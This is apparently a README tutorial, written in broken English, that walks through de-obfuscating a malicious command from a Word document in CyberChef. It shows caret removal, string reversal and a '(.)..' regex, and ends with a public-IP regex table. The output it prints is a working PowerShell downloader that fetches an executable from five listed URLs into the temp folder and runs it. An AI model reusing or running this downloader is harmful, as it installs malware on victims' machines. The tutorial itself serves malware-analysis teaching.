![logo](https://raw.githubusercontent.com/adam-p/markdown-here/master/src/common/images/icon48.png)
#### In this Tutrail i will show you how to  de-obfuscate A milieous VBS Embedded in Doc File

Start : https://www.hybrid-analysis.com/sample/9a43186e72bde764614b092b55d4dfba00f528c5f0d45e6ccb56dcee8763a845?environmentId=100 

![1](https://user-images.githubusercontent.com/29158503/60865490-d0fdcc80-a22e-11e9-8114-827ce5233897.png)



#### After Downloading the sample let go to Cyberchef to analyze the Malicious cmd.exe command present on Hyperd analysis


![2](https://user-images.githubusercontent.com/29158503/60865489-d0fdcc80-a22e-11e9-8a97-e358694714ee.png)
                                               


#### Now we need to  de-obfuscate the command using cyberchef as follow :rocket:  : 
+ Using replace| find Function to clean the code from (^) 

+ We notice there are SET for a verivble called (9ojB) we select that veribale and see we can find ! 

+ By the end of line we found "For /l  %3  IN  (+1640 ,  -3 ,+2 )", that mean the attcker telling the script to start from index 1640 (Whic is the last characker in the code )  and skkiping  two ckarakter all the way up.

+ To make this readbale lets revrese the code (Despaiye the fact it start from down top up) by using revrese function in Cybershef 

+ Now we need to select first Character and skipping two Characters by using regulare experation "(.).." and also select "List Capture Gruops" 

+ Great, All you need to do now is adding Synatx highliter to make the output more clear screen shot below 

![3](https://user-images.githubusercontent.com/29158503/60870145-f2fc4c80-a238-11e9-9774-79f7cace6eff.PNG)
                                                



```javascript
powershell $BYi='rfd';$iQF='http://mahimamedia.com/YxdW87t@http://mandujano.net/NWJ6@http://www.creativeagency.biz/Sa0BVm@http://www.brgsabz.com/sq@http://biogas-bulgaria.efarmbg.com/fiDaiHg'.Split('@');$RdW=([System.IO.Path]::GetTempPath()+'\zUw.exe');$uIY =New-Object -com 'msxml2.xmlhttp';$svp = New-Object -com 'adodb.stream';foreach($PXv in $iQF){try{$uIY.open('GET',$PXv,0);$uIY.send();If ($uIY.Status -eq 200) {$svp.open();$svp.type = 1;$svp.write($uIY.responseBody);$svp.savetofile($RdW);Start-Process $RdW;break}}catch{}}      
```








# Note(Regx)!!!

1. Public Ip 
+ ^([0-9]|[1-9][0-9]|1[0-9]{2}|2[0-4][0-9]|25[0-5])(?<!172\.(16|17|18|19|20|21|22|23|24|25|26|27|28|29|30|31))(?<!127)(?<!^10)(?<!^0)\.([0-9]|[1-9][0-9]|1[0-9]{2}|2[0-4][0-9]|25[0-5])(?<!192\.168)(?<!172\.(16|17|18|19|20|21|22|23|24|25|26|27|28|29|30|31))\.([0-9]|[1-9][0-9]|1[0-9]{2}|2[0-4][0-9]|25[0-5])\.([0-9]|[1-9][0-9]|1[0-9]{2}|2[0-4][0-9]|25[0-5])(?<!\.255$)$




| Reg           |                                                                        Defination    |
| ------------- |                                                                       :-------------:| 
| ^The          |                                             matches any string that starts with The  |
| end$          |                                                 matches a string that ends with end  | 
| (.)..         |              Start with first alphabet in list and skip two alphabet so on so fourth |  


:+1: 
